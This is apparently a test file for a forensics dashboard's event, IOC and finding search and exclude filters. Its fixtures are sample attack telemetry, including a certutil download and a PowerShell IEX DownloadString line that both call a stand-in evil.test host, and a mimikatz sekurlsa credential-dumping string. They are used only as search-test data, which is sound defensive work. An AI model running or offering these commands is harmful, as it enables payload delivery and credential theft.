import { describe, expect, it } from "vitest";
import type { FiltersApi } from "./dashboardApi.js";
import { loadDashboardModule } from "../helpers/dashboardModule.js";
import { applyFalsePositive } from "../../src/analysis/falsePositive.js";
import { emptyState } from "../../src/analysis/stateTypes.js";

// public/js/dashboard-filters.js — the search, exclude and relevance predicates (#415).
//
// These decide what an analyst sees in the four big lists. Until now none of them was reachable
// from a test, so "does the search box look inside MITRE technique IDs" was answerable only by
// reading 19,000 lines of inline script.

const f = loadDashboardModule<FiltersApi>("dashboard-filters.js");

describe("_evMatchesSearch", () => {
  const event = {
    description: "Encoded PowerShell launched",
    asset: "WKSTN-04",
    mitreTechniques: ["T1059.001"],
    sources: ["Sysmon", "unknown source"],
  };

  // The query is expected already lower-cased — every caller lower-cases it before calling, and
  // the function does not do it itself. A test passing "PowerShell" would silently match nothing,
  // which is worth stating rather than discovering.
  it("searches description, asset, techniques and sources", () => {
    for (const q of ["powershell", "wkstn", "t1059", "sysmon"]) expect(_ev(q)).toBe(true);
  });

  it("takes the query pre-lowered, and does not lower it itself", () => {
    expect(_ev("powershell")).toBe(true);
    expect(_ev("PowerShell")).toBe(false);
  });

  it("survives an event missing every optional field", () => {
    expect(f._evMatchesSearch({}, "anything")).toBe(false);
  });

  const _ev = (q: string) => f._evMatchesSearch(event, q);
});

describe("_iocMatchesSearch / _findingMatchesSearch / _fpMatchesSearch", () => {
  // #928: the analyst's own annotation became searchable. `note` is the label split out of `value`
  // by #177 ("10.10.20.15 (DC01)"), so searching "DC01" used to find nothing the analyst had typed
  // themselves. EXCLUDE deliberately did not widen with it — see _evMatchesNarrow.
  it("searches an IOC's value, type, note and merged aliases", () => {
    const ioc = {
      value: "evil.com",
      type: "domain",
      note: "DC01 staging box",
      aliasValues: ["www.evil.com"],
    };
    expect(f._iocMatchesSearch(ioc, "evil")).toBe(true);
    expect(f._iocMatchesSearch(ioc, "domain")).toBe(true);
    expect(f._iocMatchesSearch(ioc, "dc01")).toBe(true);
    expect(f._iocMatchesSearch(ioc, "www.evil.com")).toBe(true);
    expect(f._iocMatchesSearch(ioc, "mimikatz")).toBe(false);
  });

  it("excludes an IOC on value and type only, never on the note", () => {
    const ioc = { value: "evil.com", type: "domain", note: "DC01 staging box" };
    expect(f._iocMatchesExclude(ioc, ["dc01"])).toBe(false);
    expect(f._iocMatchesExclude(ioc, ["evil.com"])).toBe(true);
  });

  // The event matcher reads the whole event now (#928) while exclude stays on the four legacy
  // fields, so a saved exclude chip cannot start hiding evidence it never hid before.
  it("searches an event's message, command line, path and canonical values", () => {
    const ev = {
      description: "routine logon",
      message: "powershell.exe -enc TVqQAA",
      commandLine: "certutil -urlcache -f http://evil.test/p.exe",
      path: "C:\\Users\\bob\\evil.exe",
      canonical: { network: { destination: { address: "203.0.113.9", port: 4444 } } },
    };
    for (const q of ["-enc", "certutil", "users\\bob", "203.0.113.9", "4444"]) {
      expect(f._evMatchesSearch(ev, q), q).toBe(true);
    }
    expect(f._evMatchesSearch(ev, "mimikatz")).toBe(false);
  });

  // MUST agree with the server (companion/src/analysis/searchFilter.ts). A value the server matches
  // on and this one does not makes rows arrive from /state?q= and then be filtered straight out.
  it("matches within one value, never across two of them", () => {
    const ev = { description: "svchost started", asset: "WKS1", mitreTechniques: [], sources: [] };
    expect(f._evMatchesSearch(ev, "svchost started")).toBe(true);
    expect(f._evMatchesSearch(ev, "wks1")).toBe(true);
    expect(f._evMatchesSearch(ev, "svchost started  wks1")).toBe(false);
  });

  it("searches the decoded payload of an obfuscated command", () => {
    // Shown in the event details, so it is read and then searched for. Kept in step with the
    // server's eventSearchParts(); a field one side searches and the other does not makes rows
    // arrive from /state?q= and vanish again.
    const ev = {
      description: "powershell.exe -enc SQBFAFgA",
      deobfuscated: {
        decoded: "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')",
        method: "powershell-enc",
        iocs: ["i001"],
      },
    };
    expect(f._evMatchesSearch(ev, "downloadstring")).toBe(true);
    expect(f._evMatchesSearch(ev, "evil.test/a.ps1")).toBe(true);
    expect(f._evMatchesSearch(ev, "powershell-enc")).toBe(false);
    expect(f._evMatchesSearch(ev, "i001")).toBe(false);
  });

  it("does not let a canonical time describer match every event", () => {
    const ev = {
      description: "process created",
      canonical: {
        time: {
          observed: "2026-01-01T00:00:00Z",
          timezone: "UTC",
          precision: "millisecond",
          clockConfidence: "recorded",
        },
      },
    };
    for (const q of ["utc", "millisecond", "recorded"]) expect(f._evMatchesSearch(ev, q), q).toBe(false);
    expect(f._evMatchesSearch(ev, "2026-01-01")).toBe(true);
  });

  it("does not search canonical mapping metadata, only event values", () => {
    const ev = { description: "x", canonical: { rawFieldMap: { "process.commandLine": ["commandLine"] } } };
    expect(f._evMatchesSearch(ev, "commandline")).toBe(false);
  });

  it("excludes an event on the four legacy fields only", () => {
    const ev = { description: "routine logon", asset: "HOST01", message: "mimikatz sekurlsa" };
    expect(f._evMatchesSearch(ev, "mimikatz")).toBe(true);
    expect(f._evMatchesExclude(ev, ["mimikatz"])).toBe(false);
    expect(f._evMatchesExclude(ev, ["host01"])).toBe(true);
  });

  it("searches a finding's title, description and techniques", () => {
    const finding = { title: "Persistence", description: "run key", mitreTechniques: ["T1547"] };
    for (const q of ["persist", "run key", "t1547"]) expect(f._findingMatchesSearch(finding, q)).toBe(true);
    expect(f._findingMatchesSearch(finding, "nope")).toBe(false);
  });

  it("searches all five fields of a false-positive mark", () => {
    const mark = {
      kind: "ioc",
      ref: "abc",
      label: "internal host",
      reason: "known good",
      note: "asset owner",
    };
    for (const q of ["ioc", "abc", "internal", "known", "owner"])
      expect(f._fpMatchesSearch(mark, q)).toBe(true);
  });
});

// The exclude family is the search family wrapped in "any of these terms", and it DOES lower-case
// each term — the opposite of its own search function. That asymmetry is real and load-bearing:
// exclusions come from a comma-separated box typed by hand, searches from an already-normalised
// input handler.
describe("the exclude predicates", () => {
  const event = { description: "Encoded PowerShell", asset: "WKSTN-04" };

  it("matches if ANY term matches, and lower-cases each term itself", () => {
    expect(f._evMatchesExclude(event, ["Nope", "POWERSHELL"])).toBe(true);
    expect(f._evMatchesExclude(event, ["nope"])).toBe(false);
  });

  it("ignores empty terms rather than excluding everything", () => {
    expect(f._evMatchesExclude(event, ["", null, undefined])).toBe(false);
    expect(f._iocMatchesExclude({ value: "x" }, [""])).toBe(false);
    expect(f._findingMatchesExclude({ title: "x" }, [""])).toBe(false);
    expect(f._fpMatchesExclude({ kind: "x" }, [""])).toBe(false);
  });
});

// An event that cannot be placed in time is KEPT, not dropped. Filtering it out would quietly hide
// evidence because its source did not record a timestamp, which is the wrong default for a
// forensics tool.
describe("_evMatchesTimeRange", () => {
  const at = (ts: string) => ({ timestamp: ts });

  it("keeps an event with no timestamp, or an unparseable one", () => {
    expect(f._evMatchesTimeRange({}, "2026-01-01", "2026-02-01")).toBe(true);
    expect(f._evMatchesTimeRange(at("nonsense"), "2026-01-01", "2026-02-01")).toBe(true);
  });

  it("bounds inclusively at both ends", () => {
    expect(f._evMatchesTimeRange(at("2026-01-01T00:00:00Z"), "2026-01-01T00:00:00Z", null)).toBe(true);
    expect(f._evMatchesTimeRange(at("2026-01-01T00:00:00Z"), null, "2026-01-01T00:00:00Z")).toBe(true);
  });

  it("excludes outside either bound", () => {
    expect(f._evMatchesTimeRange(at("2025-12-31T23:59:59Z"), "2026-01-01", null)).toBe(false);
    expect(f._evMatchesTimeRange(at("2026-02-02T00:00:00Z"), null, "2026-02-01")).toBe(false);
  });

  it("ignores an unparseable bound rather than dropping everything", () => {
    expect(f._evMatchesTimeRange(at("2026-01-15T00:00:00Z"), "junk", "junk")).toBe(true);
  });
});

// The corroboration unit. Two behaviours in one function and both matter: it drops the
// "unknown source" placeholder, and it de-duplicates — so the same source name repeated cannot
// fake multi-source corroboration.
describe("realSourceCount", () => {
  it("de-duplicates and drops the unknown-source placeholder", () => {
    expect(f.realSourceCount(["Sysmon", "Sysmon", "unknown source", "EVTX"])).toBe(2);
    expect(f.realSourceCount(["unknown source"])).toBe(0);
  });

  it("subtracts sources the analyst has hidden, when asked", () => {
    expect(f.realSourceCount(["Sysmon", "EVTX"], new Set(["EVTX"]))).toBe(1);
    expect(f.realSourceCount(["Sysmon", "EVTX"])).toBe(2);
  });

  it("tolerates a missing list and falsy entries", () => {
    expect(f.realSourceCount(null)).toBe(0);
    expect(f.realSourceCount(["", null, "EVTX"])).toBe(1);
  });
});

describe("isLowSignalEvent", () => {
  const info = { severity: "Info", sources: ["Sysmon"] };

  it("flags Info-severity telemetry with nothing to corroborate it", () => {
    expect(f.isLowSignalEvent(info)).toBe(true);
  });

  it("clears the flag on anything above Info", () => {
    expect(f.isLowSignalEvent({ ...info, severity: "Low" })).toBe(false);
  });

  it.each([
    ["a finding link", { relatedFindingIds: ["fnd-1"] }],
    ["a hash", { sha256: "ab" }],
    ["a path", { path: "C:\\x" }],
    ["a process", { processName: "cmd.exe" }],
    ["a parent", { parentName: "explorer.exe" }],
    ["a chain signature", { chainSignature: "sig" }],
    ["an ATT&CK tag", { mitreTechniques: ["T1059"] }],
    ["two real sources", { sources: ["Sysmon", "EVTX"] }],
  ])("clears the flag on %s", (_label, extra) => {
    expect(f.isLowSignalEvent({ ...info, ...extra })).toBe(false);
  });

  // Relevance is a property of the event, not of the analyst's current source filter, so the chip
  // must not appear and disappear as sources are toggled. That is why the `hidden` set is
  // deliberately not passed through.
  it("ignores the hidden-source filter", () => {
    const corroborated = { severity: "Info", sources: ["Sysmon", "EVTX"] };
    expect(f.isLowSignalEvent(corroborated)).toBe(false);
  });

  it("renders a chip only when flagged, and escapes the ampersand in ATT&CK", () => {
    expect(f.lowSignalChip({ severity: "High" })).toBe("");
    const chip = f.lowSignalChip(info);
    expect(chip).toContain("low signal");
    expect(chip).toContain("ATT&amp;CK");
    expect(chip).not.toContain("ATT&CK");
  });
});

// Substring matching in BOTH directions, which is much looser than it looks: a false-positive
// entry for "powershell" suppresses "Encoded PowerShell", and an entry for "Encoded PowerShell
// launched from Word" is also suppressed by a finding titled "Encoded PowerShell".
describe("isFindingFalsePositive", () => {
  it("matches case-insensitively on either containing the other", () => {
    expect(f.isFindingFalsePositive("Encoded PowerShell", ["powershell"])).toBe(true);
    expect(f.isFindingFalsePositive("PowerShell", ["encoded powershell launched"])).toBe(true);
    expect(f.isFindingFalsePositive("  PowerShell  ", ["powershell"])).toBe(true);
  });

  it("does not match an unrelated title", () => {
    expect(f.isFindingFalsePositive("Persistence", ["powershell"])).toBe(false);
    expect(f.isFindingFalsePositive("Persistence", [])).toBe(false);
  });

  // FIXED IN #457 — this test was the pin, and it is inverted rather than deleted so the fix has a
  // permanent witness. The match is `t.includes(ref) || ref.includes(t)` and every string contains
  // "", so an unguarded empty title matched the FIRST entry in the list whatever it said.
  //
  // The client half hid a row. The SERVER half — applyFalsePositive, which shares this match by
  // design — removed the finding from InvestigationState, i.e. from the exported report. That is
  // why this is guarded on both sides and why the priority went up once the second half surfaced.
  it("keeps an untitled finding rather than matching every entry", () => {
    expect(f.isFindingFalsePositive(null, ["powershell"])).toBe(false);
    expect(f.isFindingFalsePositive("", ["anything at all"])).toBe(false);
    expect(f.isFindingFalsePositive("   ", ["anything at all"])).toBe(false);
  });

  // The mirror-image hazard, in the other direction: an empty REF matches every title, which would
  // empty the whole Findings panel. The server drops empty refs with `.filter(Boolean)`; this
  // function is handed the set already built and cannot assume that happened, so it guards too.
  // Not reachable through the API today (the route 400s a missing ref) — but "same match as the
  // server" is the contract this function states, and a mirror that holds only for reachable
  // inputs is not that.
  it("ignores an empty entry rather than suppressing everything", () => {
    expect(f.isFindingFalsePositive("Encoded PowerShell", [""])).toBe(false);
    expect(f.isFindingFalsePositive("Encoded PowerShell", ["", "powershell"])).toBe(true);
  });
});

describe("ftOriginOf / originFacets", () => {
  it("prefers the artifact name, falls back to the first source, then Unknown", () => {
    expect(f.ftOriginOf({ artifactName: "MFT", sources: ["EVTX"] })).toBe("MFT");
    expect(f.ftOriginOf({ sources: ["EVTX"] })).toBe("EVTX");
    expect(f.ftOriginOf({})).toBe("Unknown");
    expect(f.ftOriginOf({ sources: [] })).toBe("Unknown");
  });

  it("returns the distinct origins, locale-sorted", () => {
    expect(
      f.originFacets([{ artifactName: "MFT" }, { sources: ["evtx"] }, { artifactName: "MFT" }, {}]),
    ).toEqual(["evtx", "MFT", "Unknown"]);
    expect(f.originFacets(null)).toEqual([]);
  });
});

// THE MIRROR ITSELF, RUN RATHER THAN RESTATED.
//
// isFindingFalsePositive exists to answer the same question as the server's applyFalsePositive, so
// an analyst never sees a finding the report has already dropped, or vice versa. #457 was that
// mirror broken in both directions at once.
//
// The first version of this test transcribed the server's rule into a local `serverDrops` helper
// and compared the client against that. An audit caught what that actually tests: a server-only
// change leaves the transcription untouched, so the test stays green through exactly the
// divergence it exists to prevent. It was checking the client against a copy of the server, which
// is the same class of mistake as the bug.
//
// So it now imports applyFalsePositive and runs it against a real InvestigationState. If either
// side changes alone, the two answers differ and this fails.
describe("agrees with the server's applyFalsePositive", () => {
  const CASES: Array<[string, string | null, string[]]> = [
    ["an exact match", "SharpHound AD reconnaissance", ["sharphound ad reconnaissance"]],
    ["the marker inside the title", "Encoded PowerShell launched", ["powershell"]],
    ["the title inside the marker", "PowerShell", ["encoded powershell launched"]],
    ["differing case and padding", "  ENCODED PowerShell  ", ["powershell"]],
    ["no relationship at all", "Persistence via run key", ["powershell"]],
    ["an untitled finding", "", ["powershell"]],
    ["a whitespace-only title", "   ", ["powershell"]],
    ["an empty marker", "Encoded PowerShell", [""]],
    ["an empty marker beside a real one", "Encoded PowerShell", ["", "powershell"]],
    ["no markers at all", "Encoded PowerShell", []],
  ];

  /** Does the SERVER drop this finding? Answered by running the server, not by describing it. */
  const serverDrops = (title: string | null, refs: string[]): boolean => {
    const state = emptyState("parity");
    state.findings.push({
      id: "probe",
      severity: "High",
      title: title ?? "",
      description: "",
      relatedIocs: [],
      mitreTechniques: [],
      sourceScreenshots: [],
      firstSeen: "",
      lastUpdated: "",
      status: "open",
    });
    const markers = refs.map((ref, i) => ({
      id: `m${i}`,
      kind: "finding" as const,
      ref,
      reason: "other" as const,
      note: "",
      markedAt: "2026-05-28T10:00:00Z",
      markedBy: "anonymous",
    }));
    return !applyFalsePositive(state, markers).findings.some((f) => f.id === "probe");
  };

  it.each(CASES)("matches the server on %s", (_label, title, refs) => {
    expect(f.isFindingFalsePositive(title, refs)).toBe(serverDrops(title, refs));
  });

  // Guards the guard: if every case came out false on both sides the comparison would be vacuous.
  // At least one input must actually be suppressed by both.
  it("includes cases where both sides do suppress", () => {
    const suppressing = CASES.filter(([, t, r]) => serverDrops(t, r));
    expect(suppressing.length).toBeGreaterThanOrEqual(3);
    for (const [, t, r] of suppressing) expect(f.isFindingFalsePositive(t, r)).toBe(true);
  });
});

describe("isAutoBackfillFinding / isGapFinding", () => {
  it("classifies the two deterministic backfill id prefixes", () => {
    expect(f.isAutoBackfillFinding({ id: "f-auto-e1" })).toBe(true);
    expect(f.isGapFinding({ id: "f-gap-e1-e2" })).toBe(true);
  });

  it("leaves AI-synthesised findings alone", () => {
    for (const id of ["f1", "f12", "so:encoded-powershell"]) {
      expect(f.isAutoBackfillFinding({ id })).toBe(false);
      expect(f.isGapFinding({ id })).toBe(false);
    }
  });

  // The trailing hyphen is the whole point of matching on a PREFIX rather than a stem: without it
  // an AI finding that happened to be id'd "f-automation" would silently vanish from the panel.
  it("requires the trailing hyphen", () => {
    expect(f.isAutoBackfillFinding({ id: "f-automation" })).toBe(false);
    expect(f.isGapFinding({ id: "f-gapless" })).toBe(false);
  });

  it("keeps the two kinds distinct", () => {
    expect(f.isGapFinding({ id: "f-auto-e1" })).toBe(false);
    expect(f.isAutoBackfillFinding({ id: "f-gap-e1-e2" })).toBe(false);
  });

  it("survives a finding with no id at all", () => {
    expect(f.isAutoBackfillFinding({})).toBe(false);
    expect(f.isGapFinding(null)).toBe(false);
  });
});

describe("findingPassesOriginLens", () => {
  const ai = { id: "f1" };
  const auto = { id: "f-auto-e1" };
  const gap = { id: "f-gap-e1-e2" };

  it("keeps every kind when both lenses are off", () => {
    for (const x of [ai, auto, gap]) expect(f.findingPassesOriginLens(x, false, false)).toBe(true);
  });

  it("drops only backfill findings when the auto lens is on", () => {
    expect(f.findingPassesOriginLens(auto, true, false)).toBe(false);
    expect(f.findingPassesOriginLens(gap, true, false)).toBe(true);
    expect(f.findingPassesOriginLens(ai, true, false)).toBe(true);
  });

  it("drops only gap findings when the gap lens is on", () => {
    expect(f.findingPassesOriginLens(gap, false, true)).toBe(false);
    expect(f.findingPassesOriginLens(auto, false, true)).toBe(true);
    expect(f.findingPassesOriginLens(ai, false, true)).toBe(true);
  });

  it("keeps only the AI finding when both lenses are on", () => {
    expect(f.findingPassesOriginLens(ai, true, true)).toBe(true);
    expect(f.findingPassesOriginLens(auto, true, true)).toBe(false);
    expect(f.findingPassesOriginLens(gap, true, true)).toBe(false);
  });
});
